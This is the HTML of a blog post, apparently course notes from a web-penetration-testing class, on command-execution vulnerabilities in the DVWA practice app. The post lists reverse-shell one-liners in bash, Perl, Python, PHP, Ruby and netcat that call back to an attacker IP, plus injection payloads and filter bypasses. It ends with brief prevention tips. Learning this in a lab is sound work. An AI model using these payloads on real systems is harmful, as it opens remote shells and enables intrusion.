@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-TW">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+  <meta property="fb:admins" content="1817434146">
+  <meta property="fb:app_id" content="274615369727358">
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/ Ch 6 : What is Code Execution Vulnerabilities ? The 3rd meeting.Lecturer: Tony  Allows an hacker to execut OS com">
+<meta property="og:type" content="article">
+<meta property="og:title" content="What is Code Execution Vulnerabilities">
+<meta property="og:url" content="https://tony427.github.io/2017/10/31/What-is-Code-Execution-Vulnerabilities/index.html">
+<meta property="og:site_name" content="Tony Tsai&#39;s blog">
+<meta property="og:description" content="https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/ Ch 6 : What is Code Execution Vulnerabilities ? The 3rd meeting.Lecturer: Tony  Allows an hacker to execut OS com">
+<meta property="og:locale" content="zh-TW">
+<meta property="og:updated_time" content="2018-11-02T14:57:42.362Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="What is Code Execution Vulnerabilities">
+<meta name="twitter:description" content="https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/ Ch 6 : What is Code Execution Vulnerabilities ? The 3rd meeting.Lecturer: Tony  Allows an hacker to execut OS com">
+
+
+
+
+
+
+  <link rel="canonical" href="https://tony427.github.io/2017/10/31/What-is-Code-Execution-Vulnerabilities/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>What is Code Execution Vulnerabilities | Tony Tsai's blog</title>
+  
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId      : '274615369727358',
+      xfbml      : true,
+      version    : 'v2.10'
+    });
+  };
+
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "//connect.facebook.net/zh_TW/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+</script>
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-128631884-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-128631884-1');
+</script>
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-TW">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tony Tsai's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">用hexo建立的blog</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切換導航欄">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首頁</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>關於</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>標籤</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分類</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>歸檔</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tony427.github.io/2017/10/31/What-is-Code-Execution-Vulnerabilities/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tony Tsai">
+      <meta itemprop="description" content="使用hexo建立的blog">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tony Tsai's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">What is Code Execution Vulnerabilities
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+
+              
+                
+              
+
+              <time title="創建時間：2017-10-31 12:00:00" itemprop="dateCreated datePublished" datetime="2017-10-31T12:00:00+08:00">2017-10-31</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新於</span>
+                
+                <time title="修改時間：2018-11-02 22:57:42" itemprop="dateModified" datetime="2018-11-02T22:57:42+08:00">2018-11-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/資訊安全/" itemprop="url" rel="index"><span itemprop="name">資訊安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/10/31/What-is-Code-Execution-Vulnerabilities/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/10/31/What-is-Code-Execution-Vulnerabilities/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/" target="_blank" rel="noopener">https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/</a></p>
+<h2 id="Ch-6-What-is-Code-Execution-Vulnerabilities"><a href="#Ch-6-What-is-Code-Execution-Vulnerabilities" class="headerlink" title="Ch 6 : What is Code Execution Vulnerabilities ?"></a>Ch 6 : What is Code Execution Vulnerabilities ?</h2><blockquote>
+<p>The 3rd meeting.<br>Lecturer: Tony</p>
+<ul>
+<li>Allows an hacker to execut OS commands.</li>
+<li>Windows or Linux commands.</li>
+<li>Can be get used to reverse shell.</li>
+<li>Or upload any file using wget command.</li>
+<li>Code execution commands attached in the resources.</li>
+</ul>
+</blockquote>
+<h3 id="Shell-examples-with-different-env"><a href="#Shell-examples-with-different-env" class="headerlink" title="Shell examples with different env"></a>Shell examples with different env</h3><blockquote>
+<p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.</p>
+</blockquote>
+<blockquote>
+<p>Therefore in all f these cases you need to listen for port 8080 using the foolowing command</p>
+</blockquote>
+<p><code>Kali linux</code> Listening on 8080 port<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 8080</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.20.14.208/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h4 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.20.14.208&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.20.14.208&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.20.14.208&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.20.14.208&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.20.14 8080</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Try-yourself"><a href="#Try-yourself" class="headerlink" title="Try yourself"></a>Try yourself</h3><blockquote>
+<p>In this example. we are going to use the Netcat.</p>
+</blockquote>
+<p>Inject the code via input into <code>Target</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.20.14.208; pwd</span><br><span class="line">10.20.14.208 | nc -e /bin/sh 10.20.14.208 8080</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>tips. turn the DVWA security level to <code>low</code></p>
+</blockquote>
+<h4 id="Low-Security-Level"><a href="#Low-Security-Level" class="headerlink" title="Low Security Level"></a>Low Security Level</h4><blockquote>
+<p>Simply using <code>;</code> to connect the second command. <code>e.g.</code> <code>ls; pwd</code>.</p>
+</blockquote>
+<h4 id="Med-Security-Level"><a href="#Med-Security-Level" class="headerlink" title="Med Security Level"></a>Med Security Level</h4><blockquote>
+<p>It used to be work with <code>ls ; pwd</code>. But right now it may prevent the inject by using detect the <code>;</code> character. So we change another unix feature called <code>pipe</code> with symbol <code>|</code>.</p>
+</blockquote>
+<h4 id="High-Security-Level"><a href="#High-Security-Level" class="headerlink" title="High Security Level"></a>High Security Level</h4><blockquote>
+<p>View the source code. It check the ip pattern by seperating with <code>.</code> into arrarys and allowed only numbers.</p>
+</blockquote>
+<h3 id="How-to-prevent-the-code-execution-vulnerabilities"><a href="#How-to-prevent-the-code-execution-vulnerabilities" class="headerlink" title="How to prevent the code execution vulnerabilities"></a>How to prevent the code execution vulnerabilities</h3><ol>
+<li>Dont use dangerous functions. Such as any of OS functions.</li>
+<li>Filter user input before execution. e.g. the ip input formate should match the pattern xxx.xxx.xxx.xxx.</li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+          
+          <div class="social-like">
+            
+
+            
+              <div class="fb_like">
+                <div class="fb-like" data-layout="button_count" data-share="true"></div>
+              </div>
+            
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/27/The-Complete-NodeJS-Course/" rel="next" title="The-Complete-NodeJS-Course">
+                <i class="fa fa-chevron-left"></i> The-Complete-NodeJS-Course
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/20/使用JekyII建置Git-Page/" rel="prev" title="使用JekyII建置Git-Page">
+                使用JekyII建置Git-Page <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概要
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tony Tsai">
+            
+              <p class="site-author-name" itemprop="name">Tony Tsai</p>
+              <p class="site-description motion-element" itemprop="description">使用hexo建立的blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">文章</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分類</span>
+                  
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/Tony427" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.linkedin.com/in/tony-tsai-5b7b90a3/" target="_blank" title="LinkedIn"><i class="fa fa-fw fa-linkedin"></i>LinkedIn</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ch-6-What-is-Code-Execution-Vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Ch 6 : What is Code Execution Vulnerabilities ?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-examples-with-different-env"><span class="nav-number">1.1.</span> <span class="nav-text">Shell examples with different env</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BASH"><span class="nav-number">1.1.1.</span> <span class="nav-text">BASH</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PERL"><span class="nav-number">1.1.2.</span> <span class="nav-text">PERL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Python"><span class="nav-number">1.1.3.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP"><span class="nav-number">1.1.4.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ruby"><span class="nav-number">1.1.5.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat"><span class="nav-number">1.1.6.</span> <span class="nav-text">Netcat</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Try-yourself"><span class="nav-number">1.2.</span> <span class="nav-text">Try yourself</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Low-Security-Level"><span class="nav-number">1.2.1.</span> <span class="nav-text">Low Security Level</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Med-Security-Level"><span class="nav-number">1.2.2.</span> <span class="nav-text">Med Security Level</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#High-Security-Level"><span class="nav-number">1.2.3.</span> <span class="nav-text">High Security Level</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#How-to-prevent-the-code-execution-vulnerabilities"><span class="nav-number">1.3.</span> <span class="nav-text">How to prevent the code execution vulnerabilities</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> &copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tony Tsai</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://tonytsai-1.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://tony427.github.io/2017/10/31/What-is-Code-Execution-Vulnerabilities/';
+        this.page.identifier = '2017/10/31/What-is-Code-Execution-Vulnerabilities/';
+        this.page.title = 'What is Code Execution Vulnerabilities';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://tonytsai-1.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
